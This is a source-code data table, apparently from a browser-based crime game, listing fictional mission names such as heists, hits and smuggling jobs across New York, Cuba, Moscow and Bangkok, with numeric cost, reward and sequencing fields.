    ['Whack a Rival Crew Leader'                         , 28, 52,6,NY     , 38,0,'     ',,1],
    ['Influence a Harbor Official'                       , 50, 53,7,NY     , 65,0,'     ',,1],
    ['Move Stolen Merchandise'                           , 36, 54,7,NY     , 50,0,'     ',,1],
    ['Snuff a Rat'                                       , 44, 55,7,NY     , 62,0,'     ',,1],
    ['Help a Fugitive Flee the Country'                  , 40, 56,7,NY     , 57,0,'     ',,1],
    ['Dispose of a Body'                                 , 25, 57,7,NY     , 36,0,'     ',,1],
    ['Ransom a Businessman\'s Kids'                      , 60, 58,7,NY     , 70,0,'     ',,1],
    ['Fix the Big Game'                                  , 50, 59,7,NY     , 60,0,'     ',,1],
    ['Steal an Arms Shipment'                            , 45, 60,7,NY     , 66,0,'     ',,1],
    ['Extort a Corrupt Judge'                            , 24, 61,8,NY     , 36,0,'     ',,1],
    ['Embezzle Funds Through a Phony Company'            , 50, 62,8,NY     , 70,0,'     ',,1],
    ['Break Into the Armory'                             , 50, 63,8,NY     , 60,0,'     ',,1],
    ['Rip Off the Armenian Mob'                          , 50, 64,8,NY     , 68,0,'     ',,1],
    ['Muscle in on a Triad Operation'                    , 45, 65,8,NY     , 68,0,'     ',,1],
    ['Ambush a Rival at a Sit Down'                      , 55, 66,8,NY     , 80,0,'     ',,1],
    ['Order a Hit on a Public Official'                  , 35, 67,8,NY     , 55,0,'     ',,1],
    ['Take Over an Identity Theft Ring'                  , 36, 68,8,NY     , 52,0,'     ',,1],
    ['Settle a Beef... Permanently'                      , 35, 69,9,NY     , 74,0,'     ',,1],
    ['Buy Off a Federal Agent'                           , 35, 70,9,NY     , 50,0,'     ',,1],
    ['Make a Deal with the Mexican Cartel'               , 40, 71,9,NY     , 60,0,'     ',,1],
    ['Blackmail the District Attorney'                   , 44, 72,9,NY     , 66,0,'     ',,1],
    ['Shake Down a City Council Member'                  , 85, 73,9,NY     ,124,0,'     ',,1],
    ['Make Arrangements for a Visiting Don'              , 40, 74,9,NY     , 60,0,'     ',,1],
    ['Take Control of a Casino'                          , 70, 75,9,NY     ,110,0,'     ',,1],
    ['Travel to the Old Country'                         , 52, 76,9,NY     , 82,0,'     ',,1],
    // CUBA
    ['Rob Your Cab Driver'                               , 12,  1,1,CUBA   , 16,0,'     ',,1],
    ['Secure A Safehouse'                                , 36,  2,1,CUBA   , 49,0,'     ',,1],
    ['Intimidate The Locals'                             , 52,  3,1,CUBA   , 70,0,'     ',,1],
    ['Silence a Noisy Neighbor'                          , 32,  4,1,CUBA   , 44,0,'     ',,1],
    ['Smuggle In Some Supplies'                          , 34,  5,1,CUBA   , 45,0,'     ',,1],
    ['Set Up A Numbers Racket'                           , 44,  6,1,CUBA   , 60,0,'     ',,1],
    ['Establish Contact With The FRG'                    , 38,  7,1,CUBA   , 50,0,'     ',,1],
    ['Take Out The Local Police Chief'                   , 41,  8,1,CUBA   , 55,0,'     ',,1],
    ['"Persuade" A Local To Talk'                        , 51, 41,1,CUBA   , 69,0,'     ',,1],
    ['Assault A Snitch\'s Hideout'                       , 56, 42,1,CUBA   , 75,0,'     ',,1],
    ['Transport A Shipment of US Arms'                   , 42,  9,2,CUBA   , 59,0,'     ',,1],
    ['Meet With The FRG Leadership'                      , 38, 10,2,CUBA   , 54,0,'     ',,1],
    ['Hold Up A Tour Bus'                                , 45, 11,2,CUBA   , 65,0,'     ',,1],
    ['Ambush A Military Patrol'                          , 51, 12,2,CUBA   , 72,0,'     ',,1],
    ['Capture An Army Outpost'                           , 56, 13,2,CUBA   , 79,0,'     ',,1],
    ['Sneak A Friend Of The Family Into The Country'     , 35, 14,2,CUBA   , 50,0,'     ',,1],
    ['Ransack A Local Plantation'                        , 43, 15,2,CUBA   , 61,0,'     ',,1],
    ['Burn Down A Hacienda'                              , 58, 16,2,CUBA   , 82,0,'     ',,1],
    ['Offer "Protection" To A Nightclub'                 , 38, 17,3,CUBA   , 56,0,'     ',,1],
    ['Rob The Banco Nacional Branch'                     , 52, 18,3,CUBA   , 77,0,'     ',,1],
    ['Shake Down A Hotel Owner'                          , 40, 19,3,CUBA   , 58,0,'     ',,1],
    ['Bring The Local Teamsters Under Your Control'      , 46, 20,3,CUBA   , 68,0,'     ',,1],
    ['Help The FRG Steal A Truckload Of Weapons'         , 51, 21,3,CUBA   , 74,0,'     ',,1],
    ['Hijack A Booze Shipment'                           , 45, 22,3,CUBA   , 67,0,'     ',,1],
    ['Pillage A Shipyard'                                , 52, 23,3,CUBA   , 76,0,'     ',,1],
    ['Take Over The Docks'                               , 60, 24,3,CUBA   , 88,0,'     ',,1],
    ['Muscle In On A Local Casino'                       , 44, 25,4,CUBA   , 67,0,'     ',,1],
    ['Establish A Loansharking Business'                 , 49, 26,4,CUBA   , 74,0,'     ',,1],
    ['Eliminate A Rival Family\'s Agent'                 , 42, 27,4,CUBA   , 64,0,'     ',,1],
    ['Pass On Some Intel To The FRG'                     , 45, 28,4,CUBA   , 67,0,'     ',,1],
    ['Execute A Regional Arms Dealer'                    , 50, 29,4,CUBA   , 76,0,'     ',,1],
    ['Sink A Competing Smuggler\'s Ship'                 , 52, 30,4,CUBA   , 78,0,'     ',,1],
    ['Gun Down An Enemy Crew At The Airport'             , 56, 31,4,CUBA   , 85,0,'     ',,1],
    ['Assassinate An Opposing Consigliere'               , 62, 32,4,CUBA   , 93,0,'     ',,1],
    ['Raid The Arms Depot'                               , 53, 33,5,CUBA   , 81,0,'     ',,1],
    ['Supply The FRG With Some Extra Muscle'             , 46, 34,5,CUBA   , 70,0,'     ',,1],
    ['Capture The Airport'                               , 56, 35,5,CUBA   , 85,0,'     ',,1],
    ['Knock Off A Visiting Head Of State'                , 52, 36,5,CUBA   , 79,0,'     ',,1],
    ['Set Up A High Volume Smuggling Operation'          , 55, 37,5,CUBA   , 85,0,'     ',,1],
    ['Blow Up A Rail Line'                               , 50, 38,5,CUBA   , 77,0,'     ',,1],
    ['Attack The Army Command Post'                      , 58, 39,5,CUBA   , 88,0,'     ',,1],
    ['Storm The Presidential Palace'                     , 70, 40,5,CUBA   ,106,0,'     ',,1],
    ['Arrange A New York Drug Shipment'                  , 62, 43,6,CUBA   , 95,0,'     ',,1],
    ['Launder Money Through A Resort'                    , 72, 44,6,CUBA   ,110,0,'     ',,1],
    ['Loot The National Museum'                          , 78, 45,6,CUBA   ,117,0,'     ',,1],
    ['Send Some Help Home To New York'                   , 64, 46,6,CUBA   , 98,0,'     ',,1],
    ['Take Over The Havana Reconstruction'               , 82, 47,6,CUBA   ,123,0,'     ',,1],
    ['Help Get An Associate A No Bid Contract'           , 56, 48,6,CUBA   , 85,0,'     ',,1],
    ['Trans-Ship A Container Full of Refugees'           , 48, 49,6,CUBA   , 73,0,'     ',,1],
    ['Meet With "The Russian"'                           , 58, 50,6,CUBA   , 89,0,'     ',,1],
    // MOSCOW
    ['Smuggle Consumer Electronics for the Vory'         , 46,  1,1,MOSCOW , 61,0,'     ',,1], // MOSCOW EPISODE 1
    ['Arrange A Drug Shipment for the Mafiya'            , 40,  2,1,MOSCOW , 53,0,'     ',,1],
    ['Fight Off An Ultra-National Gang'                  ,112,  3,1,MOSCOW ,115,0,'     ',,1],
    ['Kidnap A Local Gang Leader for the Vory'           , 47,  4,1,MOSCOW , 63,0,'     ',,1], // CHOICE POINT (Vory = 4, Mafia = 7)
  //['Kill A Local Gang Leader for the Mafiya'           , 47,  7,1,MOSCOW , 63,0,'     ',,1],
    ['Collect The Ransom'                                , 50,  5,1,MOSCOW , 64,0,'     ',,0], // CHOICE RESULT (Vory)
    ['Receive Vory Intel On Dmitri'                      , 40,  6,1,MOSCOW , 54,0,'     ',,0],
    ['Collect the Hit Payoff'                            , 56,  8,1,MOSCOW , 76,0,'     ',,1], // CHOICE RESULT (Mafia)
    ['Buy Mafiya Intel On Dmitri'                        , 52,  9,1,MOSCOW , 74,0,'     ',,1],
    ['Threaten A Gang\'s Supplier'                       , 58, 10,1,MOSCOW , 79,0,'     ',,1],
    ['Hijack An Arms Shipment From A Militant Gang'      , 67, 11,1,MOSCOW , 90,0,'     ',,1],
    ['Hospitalize Some Nationalists'                     , 76, 12,1,MOSCOW ,104,0,'     ',,1],
    ['Confront Gang Leader Dmitri Leonov'                ,  1, 13,1,MOSCOW ,  3,0,'     ',,0],
    ['Bribe An Election Official'                        , 57, 14,2,MOSCOW , 77,0,'     ',,1], // MOSCOW EPISODE 2
    ['Silence A Political Critic'                        , 53, 15,2,MOSCOW , 73,0,'     ',,1],
    ['Violently Break Up A Campaign Rally'               ,137, 16,2,MOSCOW ,141,0,'     ',,1],
    ['Fix A Local Election for the Vory'                 , 66, 17,2,MOSCOW , 91,0,'     ',,1], // CHOICE POINT (Vory = 17, Mafia = 20)
  //['Abduct A Candidate\'s Wife For the Mafiya'         , 66, 20,2,MOSCOW , 89,0,'     ',,1],
    ['Extract A Favor From The Winner'                   , 97, 18,2,MOSCOW ,128,0,'     ',,1], // CHOICE RESULT (Vory)
    ['Catch Karpov Accepting A Bribe'                    , 77, 19,2,MOSCOW ,105,0,'     ',,1],
    ['"Convince" The Candidate To Withdraw'              , 90, 21,2,MOSCOW ,126,0,'     ',,1], // CHOICE RESULT (Mafia)
    ['Kill An Investigative Reporter'                    , 75, 22,2,MOSCOW ,107,0,'     ',,1],
    ['Pay Off The Port Authority In Arkhangelsk'         , 57, 23,2,MOSCOW , 77,0,'     ',,1],
    ['Re-route An Equipment Shipment'                    , 80, 24,2,MOSCOW ,106,0,'     ',,1],
    ['Circulate Damaging Photos'                         , 99, 25,2,MOSCOW ,137,0,'     ',,1],
    ['Take Down Party Boss Karpov'                       ,  1, 26,2,MOSCOW ,  3,0,'     ',,0],
    ['Case The RossijaBanc Building'                     , 65, 31,3,MOSCOW , 88,0,'     ',,1], // MOSCOW EPISODE 3
    ['Map Out The Escape Route'                          , 80, 32,3,MOSCOW ,108,0,'     ',,1],
    ['Rob The RossijaBanc Central Repository'            ,165, 33,3,MOSCOW ,172,0,'     ',,1],
    ['Take A Guard Hostage During Your Escape'           , 82, 34,3,MOSCOW ,112,0,'     ',,1], // CHOICE POINT (Vory = 34, Mafia = 37)
  //['Execute A Bank Guard During Your Escape'           , 82, 37,3,MOSCOW ,112,0,'     ',,1],
    ['Use The Guard\'s Keys To Access the Bank Armory'   ,105, 35,3,MOSCOW ,140,0,'     ',,1], // CHOICE RESULT (Vory)
    ['"Borrow" The Guard\'s Uniform After Releasing Him' , 88, 36,3,MOSCOW ,117,0,'     ',,1],
    ['Steal The Bank President\'s Car Keys'              , 99, 38,3,MOSCOW ,132,0,'     ',,1], // CHOICE RESULT (Mafia)
    ['Strip A Uniform Off The Corpse'                    , 91, 39,3,MOSCOW ,121,0,'     ',,1],
    ['Blackmail A Secretary For An Exec\'s Itinerary'    , 96, 40,3,MOSCOW ,129,0,'     ',,1],
    ['Dispose Of A RossijaBanc Exec At Sea'              , 89, 41,3,MOSCOW ,118,0,'     ',,1],
    ['Replace A Guard With Your Own Man'                 ,118, 42,3,MOSCOW ,165,0,'     ',,1],
    ['"Fire" Bank President Gregor Belikov'              ,  1, 43,3,MOSCOW ,  3,0,'     ',,0],
    ['Manage An Escort Service Catering to Soldiers'     ,111, 44,4,MOSCOW ,151,0,'     ',,1], // MOSCOW EPISODE 4
    ['Support The Habit Of A Procurement Officer'        ,125, 45,4,MOSCOW ,170,0,'     ',,1],
    ['Ransack A Defense Contractor\'s Office'            ,198, 46,4,MOSCOW ,210,0,'     ',,1],
    ['Fly To The Siberian Military District'             ,118, 47,4,MOSCOW ,161,0,'     ',,1], // CHOICE POINT (Vory = 47, Mafia = 50)
  //['Travel To The Volga Military District'             ,118, 50,4,MOSCOW ,161,0,'     ',,1],
    ['Rob A Troop Convoy'                                ,108, 48,4,MOSCOW ,143,0,'     ',,1], // CHOICE RESULT (Vory)
    ['Intercept The Base\'s Pay Shipment'                ,105, 49,4,MOSCOW ,143,0,'     ',,1],
    ['Arrange The Sale Of Weapons-Grade Explosives'      ,119, 51,4,MOSCOW ,158,0,'     ',,1], // CHOICE RESULT (Mafia)
    ['Arrange The Sale Of Weapons-Grade Uranium'         ,119, 51,4,MOSCOW ,158,0,'     ',,1],
    ['Capitalize On An Officer\'s Gambling Problem'      ,107, 52,4,MOSCOW ,146,0,'     ',,1],
    ['Make Connections With An Arms Dealer'              ,123, 53,4,MOSCOW ,168,0,'     ',,1],
    ['Transport Some Stolen Military Hardware'           ,125, 54,4,MOSCOW ,165,0,'     ',,1],
    ['Buy Off The General\'s Command Team'               ,134, 55,4,MOSCOW ,188,0,'     ',,1],
    ['Forcibly Demote General Osipov'                    ,  1, 56,4,MOSCOW ,  3,0,'     ',,0],
    ['Stop A Terrorist Attack In Moscow'                 ,116, 61,5,MOSCOW ,159,0,'     ',,1],  // MOSCOW EPISODE 5
    ['Discover Who Was Responsible'                      ,124, 62,5,MOSCOW ,170,0,'     ',,1],
    ['Hunt Down A Ural Liberation Front Contact'         ,215, 63,5,MOSCOW ,230,0,'     ',,1],
    ['Infiltrate The ULF Cell'                           ,132, 64,5,MOSCOW ,181,0,'     ',,1], // CHOICE POINT (Vory = 64, Mafia = 67)
  //['Discover The Location Of The Next ULF Attack'      ,132, 67,5,MOSCOW ,181,0,'     ',,1],
    ['Help "Plan" The Next Attack'                       ,121, 65,5,MOSCOW ,160,0,'     ',,1], // CHOICE RESULT (Vory)
    ['Sabotage The Plan From The Inside'                 ,127, 66,5,MOSCOW ,174,0,'     ',,1],
    ['Kill A Lookout'                                    ,127, 68,5,MOSCOW ,170,0,'     ',,1], // CHOICE RESULT (Mafia)
    ['Stop The ULF Attack'                               ,131, 69,5,MOSCOW ,180,0,'     ',,1],
    ['Torture A ULF Lieutenant'                          ,120, 70,5,MOSCOW ,164,0,'     ',,1],
    ['Look For The Boss\' Mountain Hideout'              ,135, 71,5,MOSCOW ,180,0,'     ',,1],
    ['Start An Avalanche Above The Terrorist Camp'       ,145, 72,5,MOSCOW ,205,0,'     ',,1],
    ['Battle Sonya "The Wolf" Bassinov'                  ,  1, 73,5,MOSCOW ,  3,0,'     ',,0],
    ['Foil The Sabotage Of Your Moscow Holdings'         ,130, 74,6,MOSCOW ,180,0,'     ',,1], // MOSCOW EPISODE 6
    ['Acquire Classified Files On Crime Syndicates'      ,122, 75,6,MOSCOW ,169,0,'     ',,1],
    ['Gun Down Some Russian Muscle'                      ,238, 76,6,MOSCOW ,258,0,'     ',,1],
    ['Attack A Mafiya Business'                          ,136, 77,6,MOSCOW ,188,0,'     ',,1], // CHOICE POINT (Vory = 77, Mafia = 80)
  //['Burn Down A Vory Safehouse'                        ,136, 80,6,MOSCOW ,188,0,'     ',,1],
    ['Hijack A Mafiya Cargo'                             ,134, 78,6,MOSCOW ,179,0,'     ',,1], // CHOICE RESULT (Vory)
    ['Threaten A Mafiya Moneyman\'s Family'              ,128, 79,6,MOSCOW ,176,0,'     ',,1],
    ['Hit A Vory Nightclub'                              ,128, 81,6,MOSCOW ,171,0,'     ',,1], // CHOICE RESULT (Mafia)
    ['Break Into An Architect\'s Office'                 ,134, 82,6,MOSCOW ,185,0,'     ',,1],
    ['Take Over A West-Bound Trafficking Pipeline'       ,140, 83,6,MOSCOW ,194,0,'     ',,1],
    ['Ship Black-Market Caviar To London'                ,137, 84,6,MOSCOW ,189,0,'     ',,1],
    ['Assault The Mansion Walls'                         ,148, 85,6,MOSCOW ,211,0,'     ',,1],
    ['Take Out Viktor "Sibirchik" Titov'                 ,  1, 86,6,MOSCOW ,  3,0,'     ',,0],
    //BANGKOK
    ['Move Stolen Art Through Suvarnabhumi Airport'      , 71,  1,1,BANGKOK,111,0,'     ',,1], // BANGKOK EPISODE 1
    ['Show A Cocky Biker Who\'s In Charge'               , 63,  2,1,BANGKOK,101,0,'     ',,1],
    ['Take On Local Motorcycle Thugs'                    ,189,  3,1,BANGKOK,253,0,'     ',,1],
    ['Meet A Gang\'s Rep In A Go-Go Bar'                 , 78,  5,1,BANGKOK,120,0,'     ',,1], // CHOICE POINT (Yakuza = 5, Triad = 8)
    ['Torch A Building For Insurance'                    ,110,  6,1,BANGKOK,172,0,'     ',,0], // Yakuza
    ['Arrange An "Accident" For A Witness'               , 71,  7,1,BANGKOK,111,0,'     ',,0], // Yakuza
    ['Raid One Of Suchart\'s Gambling Dens'              , 91,  9,1,BANGKOK,133,0,'     ',,0], // Triad
    ['Trash The Low-Rent Casino'                         , 71, 10,1,BANGKOK,102,0,'     ',,0], // Triad
    ['Intercept An Ammo Shipment'                        , 65, 11,1,BANGKOK, 94,0,'     ',,1], // CHOICE POINT (Yakuza = 11, Triad = 14)
    ['Deliver It To A Japanese Front Company'            , 94, 12,1,BANGKOK,130,0,'     ',,0], // Yakuza
    ['Pay Off A Corrupt Police Officer'                  , 64, 13,1,BANGKOK, 91,0,'     ',,0], // Yakuza
    ['Sneak It On To A Chinese Cargo Ship'               , 71, 15,1,BANGKOK,102,0,'     ',,0], // Triad
    ['Bribe A Dock Guard'                                , 52, 16,1,BANGKOK, 78,0,'     ',,0], // Triad
    ['Blow Up Suchart\'s Warehouse'                      ,111, 17,1,BANGKOK,164,0,'     ',,1],
    ['Take Down Boss Suchart'                            ,  1, 18,1,BANGKOK,  3,0,'     ',,0],
    ['Force A Local Landowner To Sell'                   , 67, 20,2,BANGKOK, 95,0,'     ',,1],  // BANGKOK EPISODE 2
    ['Receive A Kickback From The Buyer'                 , 73, 21,2,BANGKOK,102,0,'     ',,1],
    ['Attack A Paramilitary Police Post'                 ,136, 22,2,BANGKOK,167,0,'     ',,1],
    ['Set Up A Phony Business'                           , 62, 24,2,BANGKOK, 89,0,'     ',,1], // CHOICE POINT (Yakuza = 24, Triad = 27)
    ['Re-Route A Van Full Of Medical Supplies'           , 52, 25,2,BANGKOK, 64,0,'     ',,0], // Yakuza
    ['Resell The Stolen Supplies'                        , 52, 26,2,BANGKOK, 64,0,'     ',,0], // Yakuza
    ['Set Up A Bogus Chess Tournament'                   , 57, 28,2,BANGKOK, 77,0,'     ',,0], // Triad
    ['Rob The Chess Masters'                             , 51, 29,2,BANGKOK, 72,0,'     ',,0], // Triad
    ['Pay Off The Guards At Bangkwang Prison'            , 47, 30,2,BANGKOK, 65,0,'     ',,1], // CHOICE POINT (Yakuza = 30, Triad = 33)
    ['Sneak A Yakuza Enforcer In'                        , 40, 31,2,BANGKOK, 48,0,'     ',,0], // Yakuza
    ['Help Stage An Accident For A Tong Inmate'          , 36, 32,2,BANGKOK, 44,0,'     ',,0], // Yakuza
    ['Break A Triad Hitman Out'                          , 57, 34,2,BANGKOK, 77,0,'     ',,0], // Triad
    ['Help Rub Out A Bosozoku Leader'                    , 62, 35,2,BANGKOK, 89,0,'     ',,0], // Triad
    ['Expose A Crooked Royal Thai Police Officer'        , 94, 36,2,BANGKOK,132,0,'     ',,1],
    ['Discredit Police Commissioner Chatri'              ,  1, 37,2,BANGKOK,  3,0,'     ',,0],
    ['Secure A Pirate Vessel'                            , 43, 39,3,BANGKOK, 46,0,'     ',,1], // CHAPTER 1 // BANGKOK EPISODE 3
    ['Hire An Unsavory Crew'                             , 35, 40,3,BANGKOK, 53,0,'     ',,1], // CHAPTER 1
    ['Take Down A Rival Pirate Outfit'                   ,106, 41,3,BANGKOK,146,0,'     ',,1], // CHAPTER 1  HELP JOB
    ['Hijack A Boat Load Of Electronics'                 , 35, 43,3,BANGKOK, 53,0,'     ',,1], // CHAPTER 2  CHOICE POINT (Yakuza = 43, Triad = 46)
    ['Truck The Cargo To Kuala Lumpur'                   , 60, 44,3,BANGKOK, 93,0,'     ',,0], // CHAPTER 2  Yakuza
    ['Smuggle Cigarettes Back Into Thailand'             , 60, 45,3,BANGKOK, 93,0,'     ',,0], // CHAPTER 2  Yakuza
    ['Ship The Cargo To Jakarta'                         , 49, 47,3,BANGKOK, 75,0,'     ',,0], // CHAPTER 2  Triad
    ['Return With A Shipment Of Weapons'                 , 49, 48,3,BANGKOK, 75,0,'     ',,0], // CHAPTER 2  Triad
    ['Steal Shipping Manifests'                          , 46, 49,3,BANGKOK, 71,0,'     ',,1], // CHAPTER 3  CHOICE POINT (Yakuza = 49, Triad = 52)
    ['Steal Japanese Auto Shipping Containers'           , 56, 53,3,BANGKOK, 88,0,'     ',,0], // CHAPTER 3  Triad
    ['Offload The Cars Onto A Waiting Barge'             , 60, 54,3,BANGKOK, 93,0,'     ',,0], // CHAPTER 3  Triad
    ['Hire Divers To Retrieve The Gold Bars'             , 49, 51,3,BANGKOK, 75,0,'     ',,0], // CHAPTER 3  Yakuza
    ['Sink A Chinese Metals Freighter'                   , 53, 50,3,BANGKOK, 84,0,'     ',,0], // CHAPTER 3  Yakuza
    ['Sink A Fleet Vessel'                               ,107, 55,3,BANGKOK,135,0,'     ',,1], // FINALE
    ['Send Captain Mok Overboard'                        ,  1, 56,3,BANGKOK,  3,0,'     ',,0], // BOSS JOB
    ['Buy Some Chemicals On The Black Market'            , 68, 58,4,BANGKOK, 84,0,'     ',,1], // CHAPTER 1  //  BANGKOK EPISODE 4
    ['Make Contact With The United Wa State Army'        , 52, 59,4,BANGKOK, 64,0,'     ',,1], // CHAPTER 1
    ['Ambush A Burmese Army Convoy'                      ,144, 60,4,BANGKOK,160,0,'     ',,1], // CHAPTER 1  HELP JOB
    ['Establish Contact With A CIA Agent'                , 48, 62,4,BANGKOK, 60,0,'     ',,1], // CHAPTER 2  CHOICE POINT (Yakuza = 62, Triad = 65)
    ['Arrange To Process It In Bangkok'                  , 80, 64,4,BANGKOK,100,0,'     ',,0], // CHAPTER 2  Yakuza
    ['Set Up An Opium Shipment'                          , 76, 63,4,BANGKOK, 92,0,'     ',,0], // CHAPTER 2  Yakuza
    ['Set Up The Import Of Illegal Chinese Arms'         , 64, 66,4,BANGKOK, 80,0,'     ',,0], // CHAPTER 2  Triad
    ['Ship The Yaa Baa Payment To Phuket'                , 60, 67,4,BANGKOK, 76,0,'     ',,0], // CHAPTER 2  Triad
    ['Betray Commander Chang and the UWSA'               , 52, 68,4,BANGKOK, 64,0,'     ',,1], // CHAPTER 3  CHOICE POINT (Yakuza = 68, Triad = 71)
    ['Steal A Seized Drug Shipment'                      , 64, 70,4,BANGKOK, 80,0,'     ',,0], // CHAPTER 3  Yakuza
    ['Pass On Information To The Thai Police'            , 44, 69,4,BANGKOK, 56,0,'     ',,0], // CHAPTER 3  Yakuza
    ['Eliminate An Insurgent Escort'                     , 60, 72,4,BANGKOK, 72,0,'     ',,0], // CHAPTER 3  Triad
    ['Make Off With Stolen Military Hardware'            , 56, 73,4,BANGKOK, 68,0,'     ',,0], // CHAPTER 3  Triad
    ['Attack Chang\'s Heroin-Processing Facility'        , 88, 74,4,BANGKOK,112,0,'     ',,1], // FINALE
    ['Kill Commander Chang'                              ,  1, 75,4,BANGKOK,  3,0,'     ',,0], // BOSS JOB
    ['Ship Burmese Sapphires Into Thailand'              , 72, 77,5,BANGKOK, 92,0,'     ',,1], // CHAPTER 1  // BANGKOK EPISODE 5A-Oyabun
    ['Smuggle The Sapphires Into Tokyo'                  , 52, 78,5,BANGKOK, 68,0,'     ',,1], // CHAPTER 1
    ['Fight Off A Minato-Kai Sponsored Hit'              ,168, 79,5,BANGKOK,188,0,'     ',,1], // CHAPTER 1  HELP JOB
    ['Meet With Boss Matsumura\'s Advisor'               , 56, 81,5,BANGKOK, 72,0,'     ',,1], // CHOICE POINT CHAPTER 2 (Yakuza = 81, Triad = 84)
    ['Help Broker A Minato-Matsumura Peace'              , 68, 82,5,BANGKOK, 88,0,'     ',,0], // CHAPTER 2  Yakuza
    ['Take A Piece Of The Kabukicho Action'              , 68, 83,5,BANGKOK, 88,0,'     ',,0], // CHAPTER 2  Yakuza
    ['Assassinate The Minato-Kai Family Head'            , 64, 85,5,BANGKOK,102,0,'     ',,0], // CHAPTER 2  Triad
    ['Frame An Enemy For The Murder'                     , 67, 86,5,BANGKOK,106,0,'     ',,0], // CHAPTER 2  Triad
    ['Talk With A Police Insider About Matsumura'        , 40, 87,5,BANGKOK, 52,0,'     ',,1], // CHOICE POINT CHAPTER 3 (Yakuza = 87, Triad = 90)
    ['Gather More Evidence Of A Betrayal'                , 80, 88,5,BANGKOK,104,0,'     ',,0], // CHAPTER 3  Yakuza
    ['Get The Support Of The Yakuza Families'            , 84, 89,5,BANGKOK,108,0,'     ',,0], // CHAPTER 3  Yakuza
    ['Spread Distrust Among The Yakuza Families'         , 78, 91,5,BANGKOK,124,0,'     ',,0], // CHAPTER 3  Triad
    ['Start A War Between Matsumura and Minato'          , 78, 92,5,BANGKOK,124,0,'     ',,0], // CHAPTER 3  Triad
    ['Remove Matsumura\'s Loyal Lieutenants'             ,104, 93,5,BANGKOK,132,0,'     ',,1], // FINALE
    ['Execute Oyabun Matsumura'                          ,  1, 94,5,BANGKOK,  3,0,'     ',,0], // BOSS JOB
    ['Set Up A Drug Shipment To China'                   , 49, 96,6,BANGKOK, 79,0,'     ',,1], // CHAPTER 1  // BANGKOK EPISODE 5B-Dragon Head
    ['Dodge Customs At The Port of Hong Kong'            , 64, 97,6,BANGKOK,102,0,'     ',,1], // CHAPTER 1
    ['Win A Shoot-Out With The Kowloon Police'           ,149, 98,6,BANGKOK,208,0,'     ',,1], // CHAPTER 1  HELP JOB
    ['Intimidate Wealthy Expatriates'                    , 64,100,6,BANGKOK,102,0,'     ',,1], // CHOICE POINT CHAPTER 2 (Yakuza = 100, Triad = 103)
    ['Make An Example Of A Wealthy Industrialist'        , 64,101,6,BANGKOK,102,0,'     ',,0], // CHAPTER 2  Yakuza
    ['Fence The Goods Stolen From The Mansion'           , 60,102,6,BANGKOK, 97,0,'     ',,0], // CHAPTER 2  Yakuza
    ['Extort The Head Of The Hong Kong Polo Club'        , 67,104,6,BANGKOK,106,0,'     ',,0], // CHAPTER 2  Triad
    ['Fix The Hong Kong Polo Invitational'               , 64,105,6,BANGKOK,102,0,'     ',,0], // CHAPTER 2  Triad
    ['Talk With Wei\'s Disloyal Enforcers'               , 71,106,6,BANGKOK,115,0,'     ',,1], // CHOICE POINT CHAPTER 3 (Yakuza = 106, Triad = 109)
    ['Sneak An Industrial Spy Into Hong Kong'            , 64,107,6,BANGKOK,102,0,'     ',,0], // CHAPTER 3  Yakuza
    ['Break In To Cheng-Wei Ballistics'                  , 67,108,6,BANGKOK,106,0,'     ',,0], // CHAPTER 3  Yakuza
    ['Kidnap One Of Wei\'s Trusted Advisors'             , 56,110,6,BANGKOK, 88,0,'     ',,0], // CHAPTER 3  Triad
    ['Bury The Body Under A Construction Site'           , 60,111,6,BANGKOK, 97,0,'     ',,0], // Chapter 3  Triad
    ['Attack Wei\'s Gambling Halls'                      , 96,112,6,BANGKOK,155,0,'     ',,1], // FINALE
    ['Dispose Of Mountain Master Wei'                    ,  1,113,6,BANGKOK,  3,0,'     ',,0], // BOSS JOB
    ['Shore Up Control Of Your New Territory'            , 60,115,7,BANGKOK, 97,0,'     ',,1], // CHAPTER 1 // BANGKOK EPISODE 6-Saboteur
    ['Spread The Wealth To Your New Lieutenants'         , 71,116,7,BANGKOK,115,0,'     ',,1], // CHAPTER 1
    ['Eliminate The Last Traces Of Resistance'           ,145,117,7,BANGKOK,199,0,'     ',,1], // CHAPTER 1  HELP JOB
    ['Get A Gang Member Back Into Thailand'              , 71,119,7,BANGKOK,115,0,'     ',,1], // CHOICE POINT CHAPTER 2 (Yakuza = 119, Triad = 122)
    ['Break Into A Goverment Research Facility'          , 74,120,7,BANGKOK,119,0,'     ',,0], // CHAPTER 2  Yakuza
    ['Steal An Experimental Armor Prototype'             , 67,121,7,BANGKOK,106,0,'     ',,0], // CHAPTER 2  Yakuza
    ['Kidnap A Trade Consortium Leader'                  , 74,123,7,BANGKOK,119,0,'     ',,0], // CHAPTER 2  Triad
    ['Extort The Consortium\'s Remaining Officers'       , 64,124,7,BANGKOK,102,0,'     ',,0], // CHAPTER 2  Triad
    ['Undermine Nongchai\'s Support'                     , 78,125,7,BANGKOK,124,0,'     ',,1], // CHOICE POINT CHAPTER 3 (Yakuza = 125, Triad = 128)
    ['Acquire Information On A Government Supporter'     , 71,126,7,BANGKOK,115,0,'     ',,0], // CHAPTER 3  Yakuza
    ['Assassinate A Bangkok Council Member'              , 67,127,7,BANGKOK,106,0,'     ',,0], // CHAPTER 3  Yakuza
    ['Bribe A Royal Thai Army Colonel'                   , 74,129,7,BANGKOK,119,0,'     ',,0], // CHAPTER 3  Triad
    ['Route A Drug Shipment Through An Army Post'        , 64,130,7,BANGKOK,102,0,'     ',,0], // Chapter 3  Triad
    ['Infiltrate The Parliament House'                   , 85,131,7,BANGKOK,137,0,'     ',,1], // FINALE
    ['Depose Prime Minister Nongchai'                    ,  1,132,7,BANGKOK,  3,0,'     ',,0], // BOSS JOB
    ['Consolidate Political Power In Bangkok'            , 56,134,8,BANGKOK, 93,0,'     ',,1], // CHAPTER 1  // BANGKOK EPISODE 7-Assassin
    ['Take Over The Royal Bank Of Thailand'              , 64,135,8,BANGKOK, 97,0,'     ',,1], // CHAPTER 1
    ['Foil An Attempt On Your Life'                      ,156,136,8,BANGKOK,222,0,'     ',,1], // CHAPTER 1  HELP JOB
    ['Question The Surviving Assassin'                   , 74,138,8,BANGKOK,115,0,'     ',,1], // CHAPTER 2
    ['Gather Information On The Shadow King'             , 71,139,8,BANGKOK,115,0,'     ',,1], // CHAPTER 2
    ['Eliminate A Spy For The Shadow King'               , 85,140,8,BANGKOK,133,0,'     ',,1], // CHAPTER 2
    ['Hire A Guide To Find The Temple of Shadows'        , 64,141,8,BANGKOK,102,0,'     ',,1], // CHAPTER 3
    ['Fight Off A Hill Tribe Loyal To The Shadow King'   , 89,142,8,BANGKOK,142,0,'     ',,1], // CHAPTER 3
